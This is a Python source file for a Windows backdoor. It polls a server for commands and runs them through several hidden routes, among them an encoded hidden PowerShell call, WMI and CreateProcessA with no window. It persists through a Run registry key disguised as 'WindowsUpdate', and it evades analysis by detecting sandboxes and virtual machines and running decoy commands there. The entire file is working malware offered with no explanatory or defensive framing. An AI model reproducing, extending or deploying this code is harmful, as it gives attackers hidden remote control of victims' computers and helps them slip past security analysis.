#!/usr/bin/env python3
import urllib.request
import json
import subprocess
import sys
import os
import base64
import time
import platform
import random
import ctypes
from ctypes import wintypes
from enum import IntEnum, Enum

# String constants (replacing obfuscated strings)
REGISTRY_RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REGISTRY_VALUE_NAME = "WindowsUpdate"
USER_AGENT = "RemoteCmdExec/1.0"
CONNECTION = "close"
POWERSHELL = "powershell"
POWERSHELL_WINDOW_STYLE = "-WindowStyle"
POWERSHELL_HIDDEN = "Hidden"
POWERSHELL_ENCODED_COMMAND = "-EncodedCommand"
WMI_COMMAND_TEMPLATE = 'wmic process call create "{command}"'
REDIRECT_OUTPUT = ">nul 2>&1"
UTF8 = "utf-8"
UTF16LE = "utf-16le"
JSON_COMMAND_KEY = "command"
TASKLIST = "tasklist"

VM_PROCESSES = ["vmtoolsd", "vmwaretray", "vmwareuser", "vboxservice", "vboxtray"]

# Decoy commands for sandbox evasion
DECOY_COMMANDS = [
    'echo "Windows Update"',
    "dir %TEMP%",
    "whoami",
    "hostname",
    'systeminfo | findstr /B /C:"OS Name"',
]

# Network retry configuration
FIXED_RETRY_DELAY = 5.0  # seconds

# Internal error log (in-memory only)
_error_log = []




class Config:
    IS_WINDOWS = platform.system() == "Windows"

    class Timeout(IntEnum):
        SANDBOX_CHECK = 5
        HTTP_REQUEST = 10
        COMMAND_EXECUTION = 30
        PROCESS_WAIT = 30000

    class Threshold(IntEnum):
        UPTIME_MIN_MS = 60000
        CPU_MIN_COUNT = 2

    class Timing(Enum):
        BASE_DELAY_MIN = 1.0
        BASE_DELAY_MAX = 3.0
        JITTER_MIN = -0.2
        JITTER_MAX = 0.2
        MIN_DELAY = 0.1

    class WindowsAPI(IntEnum):
        CREATE_NO_WINDOW = 0x08000000
        CREATE_NEW_CONSOLE = 0x00000010
        SW_HIDE = 0
        STARTF_USESTDHANDLES = 0x00000100
        STARTF_USESHOWWINDOW = 0x00000001

    class Registry(IntEnum):
        HKEY_CURRENT_USER = 0x80000001
        KEY_READ = 0x20019
        KEY_WRITE = 0x20006
        REG_SZ = 1
        REG_OPTION_NON_VOLATILE = 0
        ERROR_SUCCESS = 0

    class RegistryPath:
        RUN_KEY = REGISTRY_RUN_KEY
        VALUE_NAME = REGISTRY_VALUE_NAME

    class Sandbox:
        VM_PROCESSES = VM_PROCESSES

    class Network:
        USER_AGENT = USER_AGENT
        CONNECTION = CONNECTION

    class Execution:
        POWERSHELL = POWERSHELL
        POWERSHELL_WINDOW_STYLE = POWERSHELL_WINDOW_STYLE
        POWERSHELL_HIDDEN = POWERSHELL_HIDDEN
        POWERSHELL_ENCODED_COMMAND = POWERSHELL_ENCODED_COMMAND

        @staticmethod
        def WMI_COMMAND(command: str):
            return WMI_COMMAND_TEMPLATE.replace("{command}", command)

        REDIRECT_OUTPUT = REDIRECT_OUTPUT

    class Encoding:
        UTF8 = UTF8
        UTF16LE = UTF16LE

    class JSONKey:
        COMMAND = JSON_COMMAND_KEY




def get_decoy_command() -> str:
    """Return a randomly selected decoy command."""
    return random.choice(DECOY_COMMANDS)


def is_sandbox_environment():
    if not Config.IS_WINDOWS:
        return False

    kernel32 = ctypes.windll.kernel32
    uptime_ms = kernel32.GetTickCount()
    if uptime_ms < Config.Threshold.UPTIME_MIN_MS:
        return True

    cpu_count = os.cpu_count()
    if cpu_count < Config.Threshold.CPU_MIN_COUNT:
        return True

    result = subprocess.run(
        [TASKLIST],
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.SANDBOX_CHECK,
    )
    if result.returncode == 0:
        output = result.stdout.decode(UTF8, errors="ignore").lower()
        for vm_proc in Config.Sandbox.VM_PROCESSES:
            if vm_proc in output:
                return True

    return False


def timing_evasion():
    base_delay = random.uniform(
        Config.Timing.BASE_DELAY_MIN.value, Config.Timing.BASE_DELAY_MAX.value
    )
    jitter = (
        random.uniform(Config.Timing.JITTER_MIN.value, Config.Timing.JITTER_MAX.value) * base_delay
    )
    delay = max(Config.Timing.MIN_DELAY.value, base_delay + jitter)

    start = time.time()
    while time.time() - start < delay:
        pass


def execute_via_winapi(command):
    if not Config.IS_WINDOWS:
        return False

    kernel32 = ctypes.windll.kernel32

    class STARTUPINFO(ctypes.Structure):
        _fields_ = [
            ("cb", wintypes.DWORD),
            ("lpReserved", wintypes.LPWSTR),
            ("lpDesktop", wintypes.LPWSTR),
            ("lpTitle", wintypes.LPWSTR),
            ("dwX", wintypes.DWORD),
            ("dwY", wintypes.DWORD),
            ("dwXSize", wintypes.DWORD),
            ("dwYSize", wintypes.DWORD),
            ("dwXCountChars", wintypes.DWORD),
            ("dwYCountChars", wintypes.DWORD),
            ("dwFillAttribute", wintypes.DWORD),
            ("dwFlags", wintypes.DWORD),
            ("wShowWindow", wintypes.WORD),
            ("cbReserved2", wintypes.WORD),
            ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
            ("hStdInput", wintypes.HANDLE),
            ("hStdOutput", wintypes.HANDLE),
            ("hStdError", wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", wintypes.HANDLE),
            ("hThread", wintypes.HANDLE),
            ("dwProcessId", wintypes.DWORD),
            ("dwThreadId", wintypes.DWORD),
        ]

    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    si.dwFlags = Config.WindowsAPI.STARTF_USESHOWWINDOW
    si.wShowWindow = Config.WindowsAPI.SW_HIDE

    pi = PROCESS_INFORMATION()

    CreateProcessA = kernel32.CreateProcessA
    CreateProcessA.argtypes = [
        wintypes.LPCSTR,
        wintypes.LPSTR,
        wintypes.LPVOID,
        wintypes.LPVOID,
        wintypes.BOOL,
        wintypes.DWORD,
        wintypes.LPVOID,
        wintypes.LPCSTR,
        ctypes.POINTER(STARTUPINFO),
        ctypes.POINTER(PROCESS_INFORMATION),
    ]
    CreateProcessA.restype = wintypes.BOOL

    cmd_line_buf = ctypes.create_string_buffer(command.encode("utf-8") + b"\x00")
    success = CreateProcessA(
        None,
        cmd_line_buf,
        None,
        None,
        False,
        Config.WindowsAPI.CREATE_NO_WINDOW,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi),
    )

    if not success:
        return False

    kernel32.WaitForSingleObject(pi.hProcess, Config.Timeout.PROCESS_WAIT)
    kernel32.CloseHandle(pi.hProcess)
    kernel32.CloseHandle(pi.hThread)
    return True


def execute_via_powershell(command):
    if not Config.IS_WINDOWS:
        return False

    encoded_cmd = base64.b64encode(command.encode(UTF16LE)).decode(UTF8)
    ps_command = f"{Config.Execution.POWERSHELL} {Config.Execution.POWERSHELL_WINDOW_STYLE} {Config.Execution.POWERSHELL_HIDDEN} {Config.Execution.POWERSHELL_ENCODED_COMMAND} {encoded_cmd}"

    subprocess.run(
        ps_command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.COMMAND_EXECUTION,
    )
    return True


def execute_via_os_system(command):
    old_path = os.environ.get("PATH", "")
    os.environ["PATH"] = old_path

    os.system(f"{command} {Config.Execution.REDIRECT_OUTPUT}")
    return True


def execute_via_wmi(command):
    if not Config.IS_WINDOWS:
        return False

    wmi_command = Config.Execution.WMI_COMMAND(command)
    subprocess.run(
        wmi_command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.COMMAND_EXECUTION,
    )
    return True


def execute_via_subprocess_hidden(command):
    if not Config.IS_WINDOWS:
        return False

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= Config.WindowsAPI.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = Config.WindowsAPI.SW_HIDE

    subprocess.run(
        command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.COMMAND_EXECUTION,
        startupinfo=startupinfo,
        creationflags=Config.WindowsAPI.CREATE_NO_WINDOW,
    )
    return True


def get_executable_path():
    if hasattr(sys, "frozen") and hasattr(sys, "_MEIPASS"):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(sys.argv[0])

    args = " ".join(sys.argv[1:])
    if args:
        return f'"{exe_path}" {args}'
    return f'"{exe_path}"'


def is_persisted():
    if not Config.IS_WINDOWS:
        return False

    advapi32 = ctypes.windll.advapi32

    RegOpenKeyExW = advapi32.RegOpenKeyExW
    RegOpenKeyExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.REGSAM,
        ctypes.POINTER(wintypes.HKEY),
    ]
    RegOpenKeyExW.restype = wintypes.LONG

    RegQueryValueExW = advapi32.RegQueryValueExW
    RegQueryValueExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        ctypes.POINTER(wintypes.LPDWORD),
        ctypes.POINTER(wintypes.LPDWORD),
        ctypes.POINTER(wintypes.BYTE),
        ctypes.POINTER(wintypes.DWORD),
    ]
    RegQueryValueExW.restype = wintypes.LONG

    RegCloseKey = advapi32.RegCloseKey
    RegCloseKey.argtypes = [wintypes.HKEY]
    RegCloseKey.restype = wintypes.LONG

    h_key = wintypes.HKEY()
    result = RegOpenKeyExW(
        Config.Registry.HKEY_CURRENT_USER,
        Config.RegistryPath.RUN_KEY,
        0,
        Config.Registry.KEY_READ,
        ctypes.byref(h_key),
    )

    if result != Config.Registry.ERROR_SUCCESS:
        return False

    dw_type = wintypes.DWORD()
    dw_size = wintypes.DWORD(0)

    value_name_wide = Config.RegistryPath.VALUE_NAME.encode(UTF16LE) + b"\x00\x00"

    result = RegQueryValueExW(
        h_key, value_name_wide, None, ctypes.byref(dw_type), None, ctypes.byref(dw_size)
    )

    RegCloseKey(h_key)

    if (
        result == Config.Registry.ERROR_SUCCESS
        and dw_type.value == Config.Registry.REG_SZ
        and dw_size.value > 0
    ):
        return True

    return False


def install_persistence():
    if not Config.IS_WINDOWS:
        return

    advapi32 = ctypes.windll.advapi32

    RegCreateKeyExW = advapi32.RegCreateKeyExW
    RegCreateKeyExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.LPWSTR,
        wintypes.DWORD,
        wintypes.REGSAM,
        wintypes.LPVOID,
        ctypes.POINTER(wintypes.HKEY),
        ctypes.POINTER(wintypes.LPDWORD),
    ]
    RegCreateKeyExW.restype = wintypes.LONG

    RegSetValueExW = advapi32.RegSetValueExW
    RegSetValueExW.argtypes = [
        wintypes.HKEY,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.BYTE),
        wintypes.DWORD,
    ]
    RegSetValueExW.restype = wintypes.LONG

    RegCloseKey = advapi32.RegCloseKey
    RegCloseKey.argtypes = [wintypes.HKEY]
    RegCloseKey.restype = wintypes.LONG

    exe_path_with_args = get_executable_path()

    h_key = wintypes.HKEY()
    dw_disposition = wintypes.DWORD()

    result = RegCreateKeyExW(
        Config.Registry.HKEY_CURRENT_USER,
        Config.RegistryPath.RUN_KEY,
        0,
        None,
        Config.Registry.REG_OPTION_NON_VOLATILE,
        Config.Registry.KEY_WRITE,
        None,
        ctypes.byref(h_key),
        ctypes.byref(dw_disposition),
    )

    if result != Config.Registry.ERROR_SUCCESS:
        return

    value_data = exe_path_with_args.encode(UTF16LE) + b"\x00\x00"
    value_size = len(value_data)
    value_name_wide = Config.RegistryPath.VALUE_NAME.encode(UTF16LE) + b"\x00\x00"

    value_buffer = ctypes.create_string_buffer(value_data)

    RegSetValueExW(
        h_key,
        value_name_wide,
        0,
        Config.Registry.REG_SZ,
        ctypes.cast(value_buffer, ctypes.POINTER(wintypes.BYTE)),
        value_size,
    )

    RegCloseKey(h_key)


def setup_persistence():
    if not Config.IS_WINDOWS:
        return

    if is_persisted():
        return

    # Try to install persistence, exit silently if it fails
    try:
        install_persistence()
    except Exception:
        # Exit silently if persistence installation fails
        sys.exit(0)


def fetch_command_from_server(server, port=80):
    url = f"http://{server}:{port}/"
    req = urllib.request.Request(url)
    req.add_header("User-Agent", Config.Network.USER_AGENT)
    req.add_header("Connection", Config.Network.CONNECTION)

    # Retry indefinitely with fixed delay on network failures
    while True:
        try:
            with urllib.request.urlopen(req, timeout=Config.Timeout.HTTP_REQUEST) as response:
                response_data = response.read().decode(UTF8)
                return json.loads(response_data)
        except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError, json.JSONDecodeError, KeyError):
            time.sleep(FIXED_RETRY_DELAY)
            continue


def execute_command(command):
    if is_sandbox_environment():
        # Execute decoy command instead of real command
        decoy = get_decoy_command()
        execution_methods = [
            execute_via_winapi,
            execute_via_powershell,
            execute_via_wmi,
            execute_via_subprocess_hidden,
            execute_via_os_system,
        ]
        for method in execution_methods:
            if method(decoy):
                return
        return

    timing_evasion()

    execution_methods = [
        execute_via_winapi,
        execute_via_powershell,
        execute_via_wmi,
        execute_via_subprocess_hidden,
        execute_via_os_system,
    ]

    for method in execution_methods:
        if method(command):
            return

    # All methods failed - log error internally and continue
    _error_log.append(f"Command execution failed: {command}")
    subprocess.run(
        command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=Config.Timeout.COMMAND_EXECUTION,
    )


def main():
    setup_persistence()

    server = sys.argv[1]
    port = int(sys.argv[2])

    command_data = fetch_command_from_server(server, port)
    command = command_data[Config.JSONKey.COMMAND]

    execute_command(command)


if __name__ == "__main__":
    main()
